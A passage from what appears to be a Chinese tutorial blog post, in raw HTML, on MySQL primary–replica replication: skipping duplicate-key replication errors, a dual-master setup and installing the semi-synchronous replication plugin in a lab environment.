class="hljs-operator">+</span><span class="hljs-comment">-----+------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> tea  <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+------+-----+--------+</span><br><br>##主节点插入一条记录<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;teach&#x27;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;M&#x27;</span>); <br><br>##两边的tid<span class="hljs-number">-8</span>的记录不一样了，查看一下错误<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> teach         <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> teach         <span class="hljs-operator">|</span>  <span class="hljs-number">22</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> uuu           <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> tea           <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##查出是entity <span class="hljs-number">7</span>序号<span class="hljs-number">7</span>直接堵塞掉了，第七条出问题，导致后面的记录都无法复制过去了<br>##其实是<span class="hljs-number">7</span>号和<span class="hljs-number">8</span>号都冲突了，需要跳过两个错误<br><span class="hljs-keyword">show</span> slave status \G;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> performance_schema.replication_applier_status_by_worker\G;<br><br>LAST_ERROR_MESSAGE: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000024</span>, end_log_pos <span class="hljs-number">30689864</span>; Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">execute</span> Write_rows event <span class="hljs-keyword">on</span> <span class="hljs-keyword">table</span> hellodb.teachers; <br>Duplicate entry <span class="hljs-string">&#x27;7&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;teachers.PRIMARY&#x27;</span>, Error_code: <span class="hljs-number">1062</span>; handler error HA_ERR_FOUND_DUPP_KEY; the event<span class="hljs-string">&#x27;s master log rocky-bin.000024, end_log_pos 30689864</span><br></code></pre></td></tr></table></figure><p>临时解决方案：跳过这个错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">stop slave;<br>##跳过<span class="hljs-number">2</span>个错误<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> sql_slave_skip_counter<span class="hljs-operator">=</span><span class="hljs-number">2</span>;<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@sql</span>_slave_skip_counter;<br><br><span class="hljs-keyword">start</span> slave;<br><span class="hljs-keyword">show</span> slave status \G;<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br><br>##主节点插入，有了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;teach9&#x27;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">9</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+--------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name   <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+--------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">9</span> <span class="hljs-operator">|</span> teach9 <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+--------+-----+--------+</span><br><br>##错误解决办法，手动改，多行记录的话，手动改多行记录就行<br><span class="hljs-keyword">update</span> xxx <span class="hljs-keyword">set</span> <span class="hljs-keyword">where</span><br></code></pre></td></tr></table></figure><h1 id="双主架构实现：互为主节点"><a href="#双主架构实现：互为主节点" class="headerlink" title="双主架构实现：互为主节点"></a>双主架构实现：互为主节点</h1><p>将主节点也执行change master，使其变为从节点的从节点，容易造成数据冲突，不建议使用，双向同步，假如说用户无意间写到两个不同的主，而不是一份数据双写</p><p>最好还是写一份数据，安全，不会冲突</p><p>环境：主master 10.0.0.132，从slave 10.0.0.128，现在132也是128的从</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>从节点上查看MySQL的binlog，记录binlog日志pos<br><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000004</span> <span class="hljs-operator">|</span>      <span class="hljs-number">157</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><br><span class="hljs-number">2.</span>修改change master<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.128&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;slave-bin.000004&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>;<br><br>##启动slave<br><span class="hljs-keyword">start</span> slave<br>##重置<br>reset slave <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h1 id="半同步机制-重点-：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—-gt-用于主从-主备架构"><a href="#半同步机制-重点-：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—-gt-用于主从-主备架构" class="headerlink" title="半同步机制(重点)：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—&gt;用于主从(主备架构)"></a>半同步机制(重点)：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—&gt;用于主从(主备架构)</h1><p><img src="2792175-20221007225925589-1064487165.png" alt="img"></p><p>异步复制的优点：返回结果快，写入到主库了后就返回写入成功了，SQL query set</p><p>异步复制的缺陷：如果在同步的过程中，master dump thread挂了，则无法同步，从节点的数据也不是最新的；而且在slave库还需要完成SQL thread写入到磁盘，这段如果没完成也是导致数据不是最新的情况</p><p>半同步机制：加入了检查从库是否数据落盘的插件，只有主库—从库，从库的事务commit后，写入磁盘了，主库这边才返回写入成功；或者是超过了同步延时时间，也会返回写成功</p><p>基本过程（增强型半同步复制）：优点，先检查是否同步，解决了主库返回成功后，访问从库（可能是只读库）没有数据，没同步到位的问题</p><p>1.用户提交事务（DML），执行SQL语句；客户端可能是本地socket，也可能是远端用户</p><p>2.写二进制日志</p><p>3.先等slave dump完成复制到slave</p><p>4.提交事务，写入磁盘</p><p>5.返回写成功</p><p><img src="2792175-20221007225925960-153325914.png" alt="img"></p><h2 id="模拟环境搭建一主两从：rpl-semi-sync-master-enabled"><a href="#模拟环境搭建一主两从：rpl-semi-sync-master-enabled" class="headerlink" title="模拟环境搭建一主两从：rpl_semi_sync_master_enabled"></a>模拟环境搭建一主两从：rpl_semi_sync_master_enabled</h2><p>主：132 ，从1：128，从2：131</p><p>插件：rpl_semi_sync_master_enabled，show plugins</p><h3 id="1-同步主从数据，开启slave"><a href="#1-同步主从数据，开启slave" class="headerlink" title="1.同步主从数据，开启slave"></a>1.同步主从数据，开启slave</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs sql">##Master节点操作配置<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%rpl_semi_sync_master_enabled%&#x27;</span>;<br><br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>rpl_semi_sync_master_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">on</span><br>rpl_semi_sync_master_timeout<span class="hljs-operator">=</span><br><br>##查看系统自带的插件，安装插件<br><span class="hljs-number">1.</span>binlog、密码插件认证、守护进程，存储引擎等<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> plugins;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+----------+--------------------+---------+---------+</span><br><span class="hljs-operator">|</span> Name                            <span class="hljs-operator">|</span> Status   <span class="hljs-operator">|</span> Type               <span class="hljs-operator">|</span> Library <span class="hljs-operator">|</span> License <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+----------+--------------------+---------+---------+</span><br><span class="hljs-operator">|</span> binlog                          <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> STORAGE ENGINE     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql_native_password           <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUTHENTICATION     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sha256_password                 <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUTHENTICATION     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> caching_sha2_password           <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUTHENTICATION     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sha2_cache_cleaner              <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUDIT              <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> daemon_keyring_proxy_plugin     <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> DAEMON             <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> CSV                             <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> STORAGE ENGINE     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><br><span class="hljs-number">2.</span>安装半同步插件rpl_semi_sync_master <span class="hljs-comment">--主从节点都要安装</span><br>install plugin rpl_semi_sync_master soname <span class="hljs-string">&#x27;semisync_master.so&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected, <span class="hljs-number">1</span> warning (<span class="hljs-number">0.07</span> sec)<br><br><span class="hljs-keyword">show</span> plugins;<br>rpl_semi_sync_master            <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> REPLICATION        <span class="hljs-operator">|</span> semisync_master.so <span class="hljs-operator">|</span> GPL<br><br><span class="hljs-number">3.</span>修改配置文件<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>rpl_semi_sync_master_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">on</span> ##开启半同步功能<br>rpl_semi_sync_master_timeout<span class="hljs-operator">=</span><span class="hljs-number">10000</span> ##默认超时时间：<span class="hljs-number">10</span>s，以毫秒为单位，默认<span class="hljs-number">10</span>s<br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                          <span class="hljs-number">10000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br>systemctl restart mysqld<br><br><span class="hljs-number">4.</span>查看插件状态<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br><span class="hljs-number">5.</span>完全备份到从库，确认log<span class="hljs-operator">-</span>bin的pos，##master和slave1都执行，scp到从库<br>grep <span class="hljs-operator">-</span>i &quot;change master&quot; hellodb_2022<span class="hljs-number">-09</span><span class="hljs-number">-12</span>_11:<span class="hljs-number">45</span>:<span class="hljs-number">11</span>_all.sql<br><br><span class="hljs-keyword">show</span> master status;<br><span class="hljs-comment">-- CHANGE MASTER TO MASTER_LOG_FILE=&#x27;rocky-bin.000030&#x27;, MASTER_LOG_POS=157;</span><br><br>stop slave;<br>source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<span class="hljs-operator">/</span>hellodb_2022<span class="hljs-number">-09</span><span class="hljs-number">-12</span>_11:<span class="hljs-number">45</span>:<span class="hljs-number">11</span>_all.sql<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000030&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>;<br><br><span class="hljs-keyword">start</span> slave;<br><span class="hljs-keyword">show</span> slave status \G;<br>##确认sql_io和slave_io都启动<br><br>##如果遇到以下问题，slave同步问题<br>stop slave;<br>reset slave <span class="hljs-keyword">all</span>;<br><span class="hljs-keyword">start</span> slave;<br></code></pre></td></tr></table></figure><h3 id="2-从节点安装插件"><a href="#2-从节点安装插件" class="headerlink" title="2.从节点安装插件"></a>2.从节点安装插件</h3><p>完成两边的半同步插件安装，现在没有配置timeout，都是10s</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs sql">##安装插件和卸载插件，主节点master<br>install plugin rpl_semi_sync_master soname <span class="hljs-string">&#x27;semisync_master.so&#x27;</span>;<br>uninstall plugin rpl_semi_sync_master;<br><br>##从节点安装slave<br>install plugin rpl_semi_sync_slave soname <span class="hljs-string">&#x27;semisync_slave.so&#x27;</span>;<br><br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br><span class="hljs-number">1.</span>动态设置变量<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> rpl_semi_sync_master_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">ON</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> rpl_semi_sync_slave_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">ON</span>;<br><span class="hljs-keyword">show</span> plugins;<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br><span class="hljs-number">2.</span>主写入配置文件，从写入配置文件<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>rpl_semi_sync_master_enabled<br>systemctl restart mysqld<br><br>#从写入配置文件<br>[mysqld]<br>rpl_semi_sync_slave_enabled<br>systemctl restart mysqld<br><br><br>##主节点测试查看,clients<span class="hljs-operator">=</span><span class="hljs-number">2</span>才是正确的<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> status <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%semi%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+-------+</span><br><span class="hljs-operator">|</span> Variable_name                              <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+-------+</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_clients               <span class="hljs-operator">|</span> <span class="hljs-number">2</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_net_avg_wait_time     <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_net_wait_time         <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_net_waits             <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_no_times              <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_no_tx                 <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_status                <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_timefunc_failures     <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_tx_avg_wait_time      <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_tx_wait_time          <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_tx_waits              <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_wait_pos_backtraverse <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_wait_sessions         <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_yes_tx                <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+-------+</span><br><span class="hljs-number">14</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h3 id="3-测试10s的延迟，如果过了10s没有slave响应，则返回成功"><a href="#3-测试10s的延迟，如果过了10s没有slave响应，则返回成功" class="headerlink" 